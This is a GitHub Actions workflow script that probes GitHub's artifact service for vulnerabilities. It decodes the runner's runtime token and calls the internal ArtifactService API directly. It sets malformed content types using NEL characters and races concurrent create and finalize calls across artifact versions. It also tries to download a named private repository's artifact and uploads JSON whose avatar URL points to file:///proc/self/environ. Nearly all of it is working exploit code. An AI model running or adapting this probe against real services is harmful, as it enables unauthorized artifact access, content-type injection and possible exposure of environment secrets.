name: Repo Cassette v6-v7 race probe

on:
  workflow_dispatch:

permissions:
  actions: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Probe artifact version race
        uses: actions/github-script@v7
        with:
          script: |
            const {createHash} = require('node:crypto');
            const token = process.env.ACTIONS_RUNTIME_TOKEN;
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            if (!token || !resultsUrl) throw new Error('Runtime artifact credentials unavailable');
            const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
            const scope = payload.scp.split(' ').find(s => s.startsWith('Actions.Results:'));
            if (!scope) throw new Error('Actions.Results scope missing');
            const [, runId, jobId] = scope.split(':');
            const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
            const repo = process.env.GITHUB_REPOSITORY;
            const base = new URL(resultsUrl).origin;
            const service = '/twirp/github.actions.results.api.v1.ArtifactService/';
            const weird = '\u0085application/json';
            const hex = s => Buffer.from(s, 'utf8').toString('hex');
            const reason = d => String(d?.msg || d?.code || '').slice(0, 100).replace(/https?:\/\/\S+/g, '[url]');

            async function rpc(method, body) {
              const response = await fetch(base + service + method, {
                method: 'POST',
                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
                body: JSON.stringify(body)
              });
              const data = await response.json().catch(() => ({}));
              return {status: response.status, data};
            }

            async function putBlob(url, bytes) {
              const response = await fetch(url, {
                method: 'PUT',
                headers: {
                  'x-ms-blob-type': 'BlockBlob',
                  'x-ms-blob-content-type': weird,
                  'x-ms-version': '2023-11-03',
                  'Content-Type': 'application/octet-stream'
                },
                body: bytes
              });
              if (!response.ok) throw new Error(`Azure PUT status=${response.status} code=${response.headers.get('x-ms-error-code') || 'unknown'}`);
            }

            async function inspect(artifactId, expected) {
              const repository = `${repo}/actions/artifacts/${artifactId}/zip`;
              const first = await fetch(`https://api.github.com/repos/${repository}`, {
                headers: {
                  'Accept': 'application/vnd.github.v3+json',
                  'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
                  'X-GitHub-Api-Version': '2022-11-28'
                }, redirect: 'manual'
              });
              if (first.status !== 302) return `api_status=${first.status}`;
              const location = first.headers.get('location');
              if (!location) return 'missing_location';
              const rsct = new URL(location).searchParams.getAll('rsct').map(hex).join(',') || 'absent';
              const response = await fetch(location);
              const body = Buffer.from(await response.arrayBuffer());
              const type = response.headers.get('content-type') || '';
              return `status=${response.status} rsct_utf8_hex=${rsct} type_latin1_hex=${Buffer.from(type, 'latin1').toString('hex')} body_matches=${body.equals(expected)}`;
            }

            const peerApi = 'https://api.github.com/repos/yujeong050720/repo-cassette-private/actions/artifacts/12564864913/zip';
            for (const [mode, authorization] of [
              ['anonymous', null], ['token', `Bearer ${process.env.GITHUB_TOKEN}`]
            ]) {
              const headers = {'Accept': 'application/vnd.github.v3+json'};
              if (authorization) headers.Authorization = authorization;
              const first = await fetch(peerApi, {headers, redirect: 'manual'});
              core.info(`PEER_API mode=${mode} status=${first.status}`);
              if (first.status !== 302) continue;
              const location = first.headers.get('location');
              if (!location) throw new Error('Peer download redirect lacked Location');
              const rsct = new URL(location).searchParams.getAll('rsct').map(hex).join(',') || 'absent';
              const downloaded = await fetch(location);
              const body = Buffer.from(await downloaded.arrayBuffer());
              const type = downloaded.headers.get('content-type') || '';
              core.info(`PEER_DOWNLOAD status=${downloaded.status} rsct_utf8_hex=${rsct} type_latin1_hex=${Buffer.from(type, 'latin1').toString('hex')} bytes=${body.length}`);
              try {
                const document = JSON.parse(body.toString('utf8'));
                core.info(`PEER_JSON full_name=${String(document.full_name || '').slice(0, 180)} avatar_is_file=${String(document.owner?.avatar_url || '').startsWith('file:')}`);
              } catch { core.info('PEER_BODY_NOT_JSON'); }
              break;
            }

            for (const [label, version, mime] of [
              ['V7_LEADING_NEL', 7, weird],
              ['V8_TRAILING_NEL', 8, 'application/json\u0085'],
              ['V8_LEADING_NEL', 8, weird],
              ['V7_PERCENT_85', 7, 'application/json%85'],
              ['V8_PERCENT_85', 8, 'application/json%85']
            ]) {
              const name = `mime-${label.toLowerCase()}-${process.env.GITHUB_RUN_ID}.json`;
              const response = await rpc('CreateArtifact', {
                ...ids, name,
                version, mime_type: mime
              });
              core.info(`${label} status=${response.status} ok=${response.data.ok === true} reason=${reason(response.data)}`);
              if (response.status !== 200 || response.data.ok !== true) continue;
              const uploadUrl = response.data.signed_upload_url || response.data.signedUploadUrl;
              if (!uploadUrl) throw new Error(`${label} returned no signed upload URL`);
              const placeholder = Buffer.from('{"probe":"placeholder"}');
              await putBlob(uploadUrl, placeholder);
              const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
              const finalized = await rpc('FinalizeArtifact', {
                ...ids, name, size: String(placeholder.length), hash
              });
              core.info(`${label}_FINALIZE status=${finalized.status} ok=${finalized.data.ok === true} reason=${reason(finalized.data)}`);
              if (finalized.status !== 200 || finalized.data.ok !== true) continue;
              const artifactId = finalized.data.artifact_id || finalized.data.artifactId;
              const repository = `${repo}/actions/artifacts/${artifactId}/zip`;
              const bytes = Buffer.from(JSON.stringify({
                full_name: repository,
                owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'},
                description: label
              }));
              await putBlob(uploadUrl, bytes);
              core.info(`${label}_GET artifact_id=${artifactId} ${await inspect(artifactId, bytes)}`);
            }

            for (const [label, query] of [
              ['rsct_plain', '?rsct=text%2Fplain'],
              ['rsct_nel', '?rsct=application%2Fjson%85'],
              ['response_content_type', '?response-content-type=text%2Fplain']
            ]) {
              const endpoint = `https://api.github.com/repos/${repo}/actions/artifacts/12568691901/zip${query}`;
              const first = await fetch(endpoint, {
                headers: {
                  'Accept': 'application/vnd.github.v3+json',
                  'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
                  'X-GitHub-Api-Version': '2022-11-28'
                }, redirect: 'manual'
              });
              if (first.status !== 302) {
                core.info(`QUERY ${label} api_status=${first.status}`);
                continue;
              }
              const location = first.headers.get('location');
              if (!location) throw new Error('Query test redirect lacked Location');
              const rsct = new URL(location).searchParams.getAll('rsct').map(hex).join(',') || 'absent';
              const downloaded = await fetch(location);
              const type = downloaded.headers.get('content-type') || '';
              core.info(`QUERY ${label} status=${downloaded.status} rsct_utf8_hex=${rsct} type_latin1_hex=${Buffer.from(type, 'latin1').toString('hex')}`);
            }

            const preflightName = `preflight-v6-${process.env.GITHUB_RUN_ID}.json`;
            const preflight = await rpc('CreateArtifact', {
              ...ids, name: preflightName,
              version: 6, mime_type: weird
            });
            core.info(`V6_PREFLIGHT status=${preflight.status} ok=${preflight.data.ok === true} reason=${reason(preflight.data)}`);
            if (preflight.status !== 200 || preflight.data.ok !== true) return;
            const preflightUrl = preflight.data.signed_upload_url || preflight.data.signedUploadUrl;
            if (!preflightUrl) throw new Error('v6 preflight returned no signed URL');
            const preflightBytes = Buffer.from('{"probe":"placeholder"}');
            await putBlob(preflightUrl, preflightBytes);
            const preflightHash = `sha256:${createHash('sha256').update(preflightBytes).digest('hex')}`;
            const preflightFinal = await rpc('FinalizeArtifact', {
              ...ids, name: preflightName, size: String(preflightBytes.length), hash: preflightHash
            });
            core.info(`V6_FINALIZE status=${preflightFinal.status} ok=${preflightFinal.data.ok === true} reason=${reason(preflightFinal.data)}`);
            if (preflightFinal.status === 200 && preflightFinal.data.ok === true) {
              const artifactId = preflightFinal.data.artifact_id || preflightFinal.data.artifactId;
              const repository = `${repo}/actions/artifacts/${artifactId}/zip`;
              const bytes = Buffer.from(JSON.stringify({
                full_name: repository,
                owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'},
                description: 'standalone-v6'
              }));
              await putBlob(preflightUrl, bytes);
              core.info(`V6_STANDALONE artifact_id=${artifactId} ${await inspect(artifactId, bytes)}`);
            }

            for (let i = 0; i < 8; i++) {
              const name = `race-${process.env.GITHUB_RUN_ID}-${i}.json`;
              const specs = i % 2 === 0
                ? [[6, weird], [7, 'application/json']]
                : [[7, 'application/json'], [6, weird]];
              const attempts = await Promise.all(specs.map(([version, mime]) =>
                rpc('CreateArtifact', {...ids, name, version, mime_type: mime})
              ));
              core.info(`RACE ${i} creates=${specs.map(([version], j) => `v${version}:${attempts[j].status}`).join(',')}`);
              if (!attempts.every(r => r.status === 200 && r.data.ok === true)) continue;
              const urls = attempts.map(r => r.data.signed_upload_url || r.data.signedUploadUrl);
              if (urls.some(u => !u)) throw new Error('CreateArtifact returned no signed upload URL');
              core.info(`RACE ${i} same_blob=${new URL(urls[0]).pathname === new URL(urls[1]).pathname}`);
              const placeholder = Buffer.from('{"probe":"placeholder"}');
              await Promise.all(urls.map(u => putBlob(u, placeholder)));
              const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
              const finalized = await Promise.all([
                rpc('FinalizeArtifact', {...ids, name, size: String(placeholder.length), hash}),
                rpc('FinalizeArtifact', {...ids, name, size: String(placeholder.length), hash})
              ]);
              const artifactIds = [...new Set(finalized.filter(r => r.status === 200 && r.data.ok === true)
                .map(r => r.data.artifact_id || r.data.artifactId))];
              core.info(`RACE ${i} finalize_statuses=${finalized.map(r => r.status).join(',')} ids=${artifactIds.join(',') || 'none'}`);
              for (const artifactId of artifactIds) {
                const repository = `${repo}/actions/artifacts/${artifactId}/zip`;
                const bytes = Buffer.from(JSON.stringify({
                  full_name: repository,
                  owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'},
                  description: `race-${i}`
                }));
                await Promise.all(urls.map(u => putBlob(u, bytes)));
                core.info(`RACE ${i} artifact_id=${artifactId} ${await inspect(artifactId, bytes)}`);
              }
            }
        env:
          GITHUB_TOKEN: ${{ github.token }}
